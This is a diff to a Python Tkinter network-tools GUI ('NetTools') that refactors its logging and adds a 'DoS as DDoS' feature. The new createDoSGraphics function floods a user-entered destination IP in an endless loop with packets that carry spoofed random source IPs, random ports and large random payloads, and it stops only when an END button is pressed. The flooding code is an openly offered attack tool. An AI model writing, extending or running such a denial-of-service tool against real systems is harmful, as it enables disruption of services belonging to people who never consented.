@@ -9,22 +9,13 @@ from pathlib import Path
 import socket
 import sys
 import threading
-
-class PrintToLog:
-    def __init__(self, log_func):
-        self.log_func = log_func
-
-    def write(self, message):
-        if message.strip() != "":
-            self.log_func(message.strip())
-    
-    def flush(self):
-        pass
+import random
 
 POSITIONIMAGES = str(Path(__file__).parent.absolute()) + "\\images\\"
 
 window = None
 mainFrame = None
+endDDoS = False
 
 def createGraphics(windowPassed): # Initialize the graphics for the NetTools application
     global window, mainFrame, titleLabel, logoLabel
@@ -59,9 +50,16 @@ def menuGestor(functionName): # Manage the menu selection and update the graphic
         destroyAllGraphics()
 
         createARPAnalyzerGraphics()
+    elif functionName == "DoS as DDoS":
+        destroyAllGraphics()
+
+        createDoSGraphics()
     elif functionName == "About":
         destroyAllGraphics()
         global mainFrame
+
+        mainFrame = Frame(window, bg="black")
+        mainFrame.pack(fill=BOTH, expand=True)
 
         aboutLabel = Label(mainFrame, text='''
 NetTools - Pro Network Analyzer
@@ -163,9 +161,6 @@ def createPacketGeneratorGraphics(): # Create the Packet Generator graphics
         logText.config(state=DISABLED)
 
     def startSendingProcess():
-        original_stdout = sys.stdout
-        sys.stdout = PrintToLog(writeLog)
-
         try:
             if not (packet.get_source_ip() != str(sourceIpEntry.get()) or packet.get_destination_ip() != str(destinationIpEntry.get()) or packet.get_source_port() != str(sourcePortEntry.get()) or packet.get_destination_port() != str(destinationPortEntry.get()) or packet.get_ttl() != int(ttlEntry.get()) or packet.get_message() != str(messageEntry.get(0.0, END)).strip()):
                 try:
@@ -219,18 +214,15 @@ def createPacketGeneratorGraphics(): # Create the Packet Generator graphics
                     writeLog("Invalid number of packets: " + str(e))
 
                 try:
-                    packet.connect()
-                    packet.prepare_packet()
-                    packet.send_packets()
+                    packet.connect(log_callback=writeLog)
+                    packet.prepare_packet(log_callback=writeLog)
+                    packet.send_packets(log_callback=writeLog)
                 except Exception as e:
                     writeLog("\nError: " + str(e))
         except:
             return
-        finally:
-            sys.stdout = original_stdout
 
         writeLog("\nProcess completed.")
-        sys.stdout = original_stdout
 
 def createARPAnalyzerGraphics(): # Create the ARP Analyzer graphics
     global mainFrame
@@ -276,8 +268,8 @@ def createARPAnalyzerGraphics(): # Create the ARP Analyzer graphics
     try:
         startButton = Button(mainFrame, text="Start", bg="#16c60c", fg="black", font=("Liberation Sans", 12), width=19, command=lambda: startSendingProcess())
         startButton.grid(pady=ROWPADY, padx=COLUMN1PADX, column=0, row=6, sticky=N)
-        startButton = Button(mainFrame, text="END", bg="#16c60c", fg="black", font=("Liberation Sans", 12), width=19, command=lambda: frame.set_stopProcess(True))
-        startButton.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=6, sticky=W)
+        endButton = Button(mainFrame, text="END", bg="#16c60c", fg="black", font=("Liberation Sans", 12), width=19, command=lambda: frame.set_stopProcess(True))
+        endButton.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=6, sticky=W)
     except Exception as e:
         writeLog("Error: " + str(e))
 
@@ -293,9 +285,6 @@ def createARPAnalyzerGraphics(): # Create the ARP Analyzer graphics
         arpText.config(state=DISABLED)
 
     def startSendingProcess():
-        original_stdout = sys.stdout
-        sys.stdout = PrintToLog(writeLog)
-
         try:
             try:
                 frame.set_networkIp(str(destinationIpEntry.get()))
@@ -316,7 +305,167 @@ def createARPAnalyzerGraphics(): # Create the ARP Analyzer graphics
                 writeLog("\nError: " + str(e))
         except:
             return
-        finally:
-            sys.stdout = original_stdout
+        
+def createDoSGraphics():
+    global mainFrame
 
-        sys.stdout = original_stdout
+    COLUMN1PADX = 17
+    COLUMN2PADX = 80
+    ROWPADY = 5
+
+    mainFrame = Frame(window, bg="black")
+    mainFrame.pack(fill=BOTH, expand=True)
+
+    destinationIpLabel = Label(mainFrame, text="Destination IP:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
+    destinationIpLabel.grid(pady=ROWPADY+10, padx=COLUMN1PADX, column=0, row=0, sticky=N)
+    destinationIpEntry = Entry(mainFrame, bg="white", fg="black", font=("Liberation Sans", 12))
+    destinationIpEntry.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=0, sticky=W)
+
+    messageLabel = Label(mainFrame, text="Log:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
+    messageLabel.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=1, sticky=N, columnspan=2)
+    logText = Text(mainFrame, bg="black", fg="#16c60c", font=("Liberation Sans", 12), height=10, width=50, state=DISABLED)
+    logText.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=2, sticky=W+E, columnspan=2)
+
+    logScrollbar = Scrollbar(mainFrame, command=logText.yview)
+    logScrollbar.grid(row=0, column=2, sticky='ns', pady=ROWPADY)
+
+    currentPktDataLabel = Label(mainFrame, text="Current Data:", bg="black", fg="#16c60c", font=("Liberation Sans", 12))
+    currentPktDataLabel.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=3, sticky=N, columnspan=2)
+    currentPktDataText = Text(mainFrame, bg="black", fg="#16c60c", font=("Liberation Sans", 12), height=10, width=50, state=DISABLED)
+    currentPktDataText.grid(pady=ROWPADY, padx=(COLUMN1PADX, COLUMN2PADX), column=0, row=4, sticky=W+E, columnspan=2)
+
+    currentPktDataScrollbar = Scrollbar(mainFrame, command=currentPktDataText.yview)
+    currentPktDataScrollbar.grid(row=0, column=2, sticky='ns', pady=ROWPADY)
+
+    try:
+        packet = Packet() # Initialize the Packet class
+    except Exception as e:
+        writeLog("Error initializing Packet class:", e)
+
+    try:
+        startButton = Button(mainFrame, text="Start", bg="#16c60c", fg="black", font=("Liberation Sans", 12), width=19, command=lambda: threading.Thread(target=startSendingProcess, args=()).start())
+        startButton.grid(pady=ROWPADY, padx=COLUMN1PADX, column=0, row=6, sticky=N)
+        endButton = Button(mainFrame, text="END", bg="#16c60c", fg="black", font=("Liberation Sans", 12), width=19, command=lambda: stopDDoSProcess(True))
+        endButton.grid(pady=ROWPADY, padx=COLUMN2PADX, column=1, row=6, sticky=W)
+    except Exception as e:
+        writeLog("Error: " + str(e))
+
+    # Internal use only functions
+    def writeLog(message):
+        logText.config(state=NORMAL)
+        logText.insert(END, message + "\n")
+        logText.see(END)
+        logText.config(state=DISABLED)
+
+    def writeCurrentData(message):
+        currentPktDataText.config(state=NORMAL)
+        currentPktDataText.insert(END, message + "\n")
+        currentPktDataText.see(END)
+        currentPktDataText.config(state=DISABLED)
+
+    def getRandomIp():
+        return str(str(random.randint(1, 255))+"."+str(random.randint(1, 255))+"."+str(random.randint(1, 255))+"."+str(random.randint(1, 255)))
+    
+    def getRandomStr():
+        # 2 char = 1 byte max 65515 byte
+        lenght = random.randint(1, 65515*2)
+        randStr = ""
+
+        for i in range(lenght):
+            randStr += chr(random.randint(33, 126))  # Printable ASCII characters
+        
+        return str(randStr)
+    
+    def setNewPacketData():
+        try:
+            try:
+                packet.set_source_ip(getRandomIp())
+            except Exception as e:
+                writeLog("Invalid IP address: " + str(e))
+            
+            try:
+                packet.set_destination_ip(str(destinationIpEntry.get()))
+            except Exception as e:
+                writeLog("Invalid IP address or DNS: " + str(e))
+            
+            try:
+                packet.set_source_port(str(random.randint(1024, 65535)))
+            except Exception as e:
+                writeLog("Invalid source port: " + str(e))
+            
+            try:
+                packet.set_destination_port(str(random.randint(1024, 65535)))
+            except Exception as e:
+                writeLog("Invalid destination port: " + str(e))
+            
+            try:
+                packet.set_ttl(int(255)) # Default TTL for DoS attacks
+            except Exception as e:
+                writeLog("Invalid ttl: " + str(e))
+            
+            try:
+                packet.set_message(str(getRandomStr()).strip())
+            except Exception as e:
+                writeLog("Invalid message: " + str(e))
+            
+            try:
+                packet.set_payload_length(len(packet.get_message().encode()))
+            except Exception as e:
+                writeLog("Invalid payload length: " + str(e))
+            
+            try:
+                packet.set_number_packets(int(10)) # Default number of packets for DoS attacks
+            except Exception as e:
+                writeLog("Invalid number of packets: " + str(e))
+
+            writeCurrentData(f'''
+New packet data set:
+Source IP: {packet.get_source_ip()}
+Destination IP: {packet.get_destination_ip()}
+Source Port: {packet.get_source_port()}
+Destination Port: {packet.get_destination_port()}
+Message: OMITTED (for length reasons)
+Payload Length: {packet.get_payload_length()}
+''')
+        except Exception as e:
+            writeLog("\nError: " + str(e))
+            return
+        
+        writeLog("\nNew packet data set successfully.")
+        return
+    
+    def stopDDoSProcess(stop):
+        global endDDoS
+
+        if stop:
+            endDDoS = True
+
+    def startSendingProcess():
+        global endDDoS
+        
+        while not endDDoS:
+            try:
+                try:
+                    setNewPacketData()
+                except Exception as e:
+                    writeLog("\nError: " + str(e))
+                
+                try:
+                    packet.connect(writeLog)
+                except Exception as e:
+                    writeLog("\nError: " + str(e))
+                
+                try:
+                    packet.prepare_packet(writeLog)
+                except Exception as e:
+                    writeLog("\nError: " + str(e))
+                
+                try:
+                    packet.send_packets(writeLog, timeoutForRespoonse=0)
+                except Exception as e:
+                    writeLog("\nError: " + str(e))
+            except Exception as e:
+                writeLog("\nError: " + str(e))
+                return
+            
+        writeLog("\nProcess completed.")
